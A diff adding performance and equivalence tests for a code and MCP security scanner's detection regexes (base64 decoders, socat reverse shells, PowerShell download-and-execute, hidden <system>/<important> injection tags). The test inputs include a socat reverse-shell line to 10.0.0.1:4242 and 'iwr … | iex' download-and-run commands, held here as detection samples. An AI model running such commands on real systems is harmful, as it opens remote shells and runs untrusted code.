@@ -153,6 +153,98 @@ describe('dt15 perf: line regexes stay linear on 100 KB runs', () => {
   });
 });
 
+describe('dt16 perf: Buffer.from decoders, RS-007, CP-006 and the tag regex', () => {
+  const N = 100_000;
+  const rep = (s: string, tail = '') => s.repeat(Math.ceil(N / s.length)) + tail;
+  const ids = (line: string) => scanWithPatterns(line).map(m => m.pattern);
+  const tagRe = async () => {
+    const { DIRECTIVE_PATTERNS } = await import('../mcp/injection-directives.js');
+    return DIRECTIVE_PATTERNS.find(d => d.label.startsWith('hidden-instruction tag (<important>'))!.re;
+  };
+
+  it('Buffer.from decoder patterns on thousands of Buffer.from( calls', async () => {
+    const { analyzeStringTable } = await import('../mcp/string-table.js');
+    const { analyzeObfuscation } = await import('./obfuscation.js');
+    for (const code of [rep('Buffer.from(', ',Buffer.from(,"base64")'), rep('Buffer.from( '), rep('.toString(Buffer.from(', '.toString(,Buffer.from(,S).toString(')]) {
+      expect(timed(() => analyzeStringTable(code))).toBeLessThan(1000);
+      expect(timed(() => analyzeObfuscation(code))).toBeLessThan(1000);
+    }
+    expect(timed(() => ids('O' + rep('"BASE64")BUFFER.FROM(O', '"BASE64"),BUFFER.FROM(F,"BASE64")')))).toBeLessThan(1000);
+    expect(analyzeStringTable('Buffer.from( Buffer.from(x, "base64")').decoderLabels).toContain("Buffer.from(…, 'base64')");
+    expect(analyzeStringTable("Buffer.from(s, 'hex')").decoderLabels).toContain("Buffer.from(…, 'hex')");
+    expect(analyzeStringTable('Buffer.from(s, ENC).toString()').decoderLabels).toContain('Buffer.from(…, <encoding>)');
+    expect(analyzeObfuscation("Buffer.from( Buffer.from(t, 'base64')").decoderLabels).toContain("Buffer.from(…, 'base64')");
+    expect(ids("buffer.from(buffer.from(x),'base64')").concat(ids("Buffer.from(Buffer.from(x, 'base64')"))).toContain('OB-001');
+    expect(analyzeStringTable('Buffer.from(s)').decoderLabels).toEqual([]);
+  });
+
+  it('RS-007 on a line of thousands of socat words', () => {
+    expect(timed(() => ids(rep('XEC:SOCAT:', 'XEC:\nSOCAT:EXEC:')))).toBeLessThan(1000);
+    expect(timed(() => ids(rep('socat ')))).toBeLessThan(1000);
+    expect(ids('socat socat TCP:10.0.0.1:4242 EXEC:/bin/sh,pty')).toContain('RS-007');
+    expect(ids('socat TCP-LISTEN:8080 TCP:localhost:80')).not.toContain('RS-007');
+  });
+
+  it('CP-006 on download words and on a space run after iex', () => {
+    expect(timed(() => ids(rep('IWR\x00')))).toBeLessThan(1000);
+    expect(timed(() => ids(`iex${' '.repeat(N)}`))).toBeLessThan(1000);
+    expect(ids('iwr iwr https://x.test/a.ps1 | iex')).toContain('CP-006');
+    expect(ids('iex (  ( New-Object Net.WebClient).DownloadString("https://x.test")')).toContain('CP-006');
+    expect(ids('IEX(IRM https://x.test/a.ps1)')).toContain('CP-006');
+    expect(ids('iwr https://x.test/a.zip -OutFile a.zip | Out-Null')).not.toContain('CP-006');
+  });
+
+  it('hidden-instruction tag regex on a run of unquoted attributes holding tag names', async () => {
+    const tag = await tagRe();
+    expect(timed(() => tag.test(rep('<SYSTEM\tR=Y', '"')))).toBeLessThan(1000);
+    expect(timed(() => tag.test(rep(' a=<system')))).toBeLessThan(1000);
+    expect(timed(() => tag.test(rep('<system  a  =  b')))).toBeLessThan(1000);
+    expect(tag.test('<system a=x<system b="y">')).toBe(true);
+    expect(tag.test('<system a="<system>')).toBe(true); // inside a quoted value: still tried
+    expect(tag.test('foo=<important>')).toBe(true);
+    expect(tag.test('<system tmp>/cache')).toBe(false);
+  });
+
+  it('match the same as the previous patterns on random input', async () => {
+    const { analyzeStringTable } = await import('../mcp/string-table.js');
+    const { analyzeObfuscation } = await import('./obfuscation.js');
+    const tag = await tagRe();
+    const OLD = {
+      b64: /Buffer\.from\s*\([^,)]*,\s*['"`](?:base64|base64url)['"`]\s*\)/,
+      hex: /Buffer\.from\s*\([^,)]*,\s*['"`]hex['"`]\s*\)/,
+      enc: /Buffer\.from\s*\([^,)]*,\s*[A-Za-z_$][\w$.]*\s*\)\s*\.toString\s*\(/,
+      obf: /Buffer\.from\s*\([^,)]*,\s*['"`]base64['"`]\s*\)/,
+      ob001: /\bBuffer\.from\s*\([^,]+,\s*['"]base64['"]\)/i,
+      rs007: /\bsocat\b.*\bexec:/i,
+      cp006: /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\s*\(?\s*(?:\(\s*)?(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b/i,
+      tag: /<\/?(?:important|system|instructions?)(?:\s+[\w:-]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>"']+))*\s*\/?>/i,
+    };
+    const buf = ['Buffer.from(', 'buffer.from(', 'xBuffer.from(', '(', ')', ',', ' ', '"', "'", '`', 'base64', 'hex', 'x', 'a.b', '.toString(', ",'base64')", ', "base64url")', ',"hex")', ', E).toString(', '\n'];
+    const sh = ['socat', 'SOCAT', 'xsocat', ' ', 'exec:', 'EXEC:', ':', '\n', 'iwr', 'IRM', 'invoke-webrequest', 'iex', 'invoke-expression', '|', '(', 'new-object', 'net.webclient', '-', '| iex', 'iex (iwr'];
+    const tg = ['<system', '<SYSTEM', '<important', '<instructions', '</system', '<', '>', '/', '/>', ' ', '\t', 'a', 'b:c', '=', '"', "'", 'x'];
+    let seed = 7;
+    const rnd = (n: number) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
+    const gen = (tokens: string[]) => Array.from({ length: 1 + rnd(30) }, () => tokens[rnd(tokens.length)]).join('');
+    const has = (labels: string[], l: string) => labels.includes(l);
+    for (let i = 0; i < 20_000; i++) {
+      const b = gen(buf);
+      const st = analyzeStringTable(b).decoderLabels;
+      expect(has(st, "Buffer.from(…, 'base64')"), b).toBe(OLD.b64.test(b));
+      expect(has(st, "Buffer.from(…, 'hex')"), b).toBe(OLD.hex.test(b));
+      expect(has(st, 'Buffer.from(…, <encoding>)'), b).toBe(OLD.enc.test(b));
+      expect(has(analyzeObfuscation(b).decoderLabels, "Buffer.from(…, 'base64')"), b).toBe(OLD.obf.test(b));
+      const line = b.replace(/\n/g, ' ');
+      expect(ids(line).includes('OB-001'), line).toBe(OLD.ob001.test(line));
+      const s = gen(sh).replace(/\n/g, ' ');
+      expect(ids(s).includes('RS-007'), s).toBe(OLD.rs007.test(s));
+      expect(ids(s).includes('CP-006'), s).toBe(OLD.cp006.test(s));
+      const t = gen(tg);
+      expect(tag.exec(t)?.[0], t).toBe(OLD.tag.exec(t)?.[0]);
+      expect(tag.exec(t)?.index, t).toBe(OLD.tag.exec(t)?.index);
+    }
+  }, 30_000);
+});
+
 describe('Python string-literal scanning is linear (dt14 N2)', () => {
   it('an unterminated run of escaped quotes', async () => {
     const { mapStringLiterals } = await import('./python-sinks.js');
